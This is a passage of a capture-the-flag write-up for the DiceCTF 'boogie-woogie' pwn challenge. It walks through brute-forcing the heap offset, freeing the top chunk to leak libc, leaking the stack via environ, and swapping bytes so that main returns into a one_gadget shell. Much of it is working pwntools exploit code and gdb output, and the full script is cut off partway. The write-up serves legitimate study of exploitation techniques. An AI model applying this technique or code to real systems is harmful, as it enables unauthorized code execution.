+<p>12bits is kind of too much, because a PoW has been added, and pepsipu himself stated that we can decrease it more, but how?</p>
+<p>We know, that the heap is of size 0x21000. what if, our guess to the heap will hit anywhere in the heap? if we don&rsquo;t crash, we know that our offset is in the range of <code>[heap_base, heap_base + 0x21000]</code>.</p>
+<p>since we can also read from that address, we can dynamiclly go backwards, until we reach the start of the heap!</p>
+<p>The first chunk of the heap will be the tcache_perthread, and its size field is 0x291.</p>
+<p>we can easily scan the heap until we see this value, indicating we found the start of the heap.</p>
+<p>To find the most optimal guess, I ran ton of tests with my <code>./test</code> program, and found the median of those values, it gave me: 0x121b000.</p>
+<p>Here is the first part of my exploit, which finds the offset to the heap:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-py">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_base_heap_offset</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">p</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">heap_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;Segmentation fault&#39;</span> <span class="ow">in</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Wrong guess. trying again...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">curr</span> <span class="o">=</span> <span class="n">heap_offset</span> <span class="o">+</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">#writing non-null to 0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x22</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Trying </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">curr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clap</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">curr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">13</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">leak</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x91</span><span class="s1">&#39;</span><span class="p">:</span> <span class="c1">#if its the start of heap</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">curr</span> <span class="o">-</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">        <span class="n">curr</span> <span class="o">-=</span> <span class="mh">0x1000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">p</span>
+</span></span><span class="line"><span class="cl">    <span class="n">heap_offset</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">heap_offset</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">REMOTE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;mc.ax&#34;</span> <span class="p">,</span> <span class="mi">31040</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;work:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">work</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">token</span> <span class="o">=</span> <span class="n">work</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">PoW</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;./pow </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">PoW</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">PoW</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">heap_offset</span> <span class="o">=</span> <span class="n">find_base_heap_offset</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">idx</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">heap_offset</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">#swap back the tcache sizefield</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Found heap start @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_offset</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>Now, we can read/write whatever we want to the heap.</p>
+<p>But what can we do with it?</p>
+<p>We don&rsquo;t really have a free primitive, and we can only allocate chunks with the scanf.</p>
+<p>Let&rsquo;s not forget the top_chunk!</p>
+<p>the top chunk will contain all of the unused heap data, and its size field will indicate how many bytes are left in the heap.</p>
+<p>When the heap allocator tries to allocate a chunk bigger than the top chunk, it will free the top chunk, and allocate more space to the heap.</p>
+<p>With our primitive, we can decrease the size of the top chunk to be really small, allocate a big chunk with our scanf (we can do something like <code>clap(&quot;1&quot; * 0x700, &quot;1&quot; * 0x900)</code>), and this will free the topchunk into the unsorted bin, and give us a libc leak!</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-py">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="n">heap_offset</span><span class="o">+</span> <span class="mh">0xab8</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1">#write nullbyte to third byte, 0x200 probably contain nullbyte since its in the bss</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="s2">&#34;1&#34;</span> <span class="o">*</span> <span class="mh">0x700</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span> <span class="o">*</span> <span class="mh">0x900</span><span class="p">)</span> <span class="c1">#free top chunk</span>
+</span></span><span class="line"><span class="cl">    <span class="n">unsorted_bin_offset</span> <span class="o">=</span> <span class="mh">0xac0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">slap_length</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">heap_offset</span> <span class="o">+</span> <span class="n">unsorted_bin_offset</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">12</span><span class="p">:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x21ace0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;LIBC @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>Here I overwrote the third byte of the top chunk with a nullbyte, which made the top chunk size be something like 0x701.</p>
+<p>Then I allocated a big chunk with the scanf, and it freed the top chunk, and we can easily read it.</p>
+<p>Now, after we have a libc leak, we can easily get a stack leak, to do ROP, via the <code>environ</code> symbol inside libc:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-py">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">    <span class="n">offset_to_environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">environ</span> <span class="o">-</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">data</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">slap_length</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">offset_to_environ</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">12</span><span class="p">:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ret_address</span> <span class="o">=</span> <span class="n">stack_leak</span> <span class="o">-</span> <span class="mh">0x120</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;STACK @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>Since we don&rsquo;t really have a fully arbitrary write primitive (we can just swap stuff), we are really limited with our rop chain, and it will be hard to write a lot of bytes.</p>
+<p>Searching for one_gadgets, reveals this one:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>0xebc88 execve(&#34;/bin/sh&#34;, rsi, rdx)
+constraints:
+  address rbp-0x78 is writable
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL</code></pre></div>
+<p>We can break at main&rsquo;s ret, and see that both RSI and RDI are 0:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code> RAX  0x0
+ RBX  0x0
+ RCX  0x555555563020 (data) ◂— 0x63206e6574736900
+ RDX  0x0
+ RDI  0x0
+ RSI  0x0
+ R8   0x0
+ R9   0x0
+ R10  0x7ffff7dbeac0 ◂— 0x100000000
+ R11  0x7ffff7dbf3c0 ◂— 0x2000200020002
+ R12  0x7fffffffdef8 —▸ 0x7fffffffe26e ◂— &#39;/home/itay/Desktop/dicectf/pwn/boogie/boogie-woogie&#39;
+ R13  0x555555555258 (main) ◂— endbr64 
+ R14  0x555555562da8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555160 (__do_global_dtors_aux) ◂— endbr64 
+ R15  0x7ffff7ffd040 —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
+*RBP  0x1
+*RSP  0x7fffffffdde8 —▸ 0x7ffff7c29d90 ◂— mov edi, eax
+*RIP  0x55555555531f (main+199) ◂— ret 
+
+   0x55555555531e &lt;main+198&gt;    leave  
+ ► 0x55555555531f &lt;main+199&gt;    ret    &lt;0x7ffff7c29d90&gt;</code></pre></div>
+<p>RBP-0x78 is not writable tho, but it is stored right before the return pointer, and we can easily swap a stack address into it.
+Since the original return pointer of main is already a libc address (points to libc_start_main), we only need to write 3 bytes for it to jump to our one_gadget.</p>
+<p>Since our primitive is a swap primitive, in order to write something to the return pointer , we need to have it anywhere in a writable page.
+To overcome this issue, I have dumped all of libc&rsquo;s bss, with the <code>dump binary memory libc_dump 0x7ffff7e1a000 0x7ffff7e29000</code> command in gdb. This memory contains some pointers so it will be some of it will change each run, but its good enough to us.</p>
+<p>Here is the final part of the exploit:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-py">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">    <span class="n">slap_length</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">ret_address</span> <span class="o">-</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">data</span> <span class="o">-</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">#copy stack address to RBP</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">char_set_libc</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;libc_dump&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()]</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xebc88</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">one_gadget</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">bss_address</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21a000</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">idx</span> <span class="o">=</span> <span class="n">char_set_libc</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">bss_address</span> <span class="o">-</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clap</span><span class="p">(</span><span class="n">ret_address</span> <span class="o">-</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">data</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">#Trigger ret</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cat flag.txt&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div>
+<p>we went through each byte we want to write, found an index to it in libc&rsquo;s bss, and swapped with it.
+This is somwhat stable, and after a few minutes of it running, we got the flag!!</p>
+<p>Here is the full exploit:</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-py">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./boogie-woogie&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">REMOTE</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">REMOTE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#p = remote(&#34;localhost&#34; , 5000)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;mc.ax&#34;</span> <span class="p">,</span> <span class="mi">31040</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;work:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">work</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PoW</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">work</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">PoW</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">char_set</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;bss_dump&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x10000</span>
+</span></span><span class="line"><span class="cl"><span class="n">char_set_libc</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;libc_dump&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()]</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">clap</span><span class="p">(</span><span class="n">idx1</span><span class="p">,</span> <span class="n">idx2</span><span class="p">,</span> <span class="n">c</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;exception:</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx1</span><span class="p">)</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx2</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;SENT CLAP&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_to_offset</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">what</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">what</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">idx</span> <span class="o">=</span> <span class="n">char_set</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">what</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">char_set</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xff</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">idx</span> <span class="o">=</span> <span class="n">char_set_libc</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">what</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21a000</span> <span class="o">-</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">idx</span><span class="p">),</span> <span class="n">what</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>                
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">idx</span><span class="p">),</span> <span class="n">what</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clap</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">slap_length</span><span class="p">(</span><span class="n">offset1</span><span class="p">,</span> <span class="n">offset2</span><span class="p">,</span> <span class="n">length</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clap</span><span class="p">(</span><span class="n">offset1</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">offset2</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">end_bss</span> <span class="o">=</span> <span class="mh">0xfe0</span> <span class="c1">#offset to the end of the bss, from our data variable</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_offset</span> <span class="o">=</span> <span class="n">end_bss</span> <span class="o">+</span> <span class="mh">0x121b000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_base_heap_offset</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">p</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">heap_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;Segmentation fault&#39;</span> <span class="ow">in</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Wrong guess. trying again...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
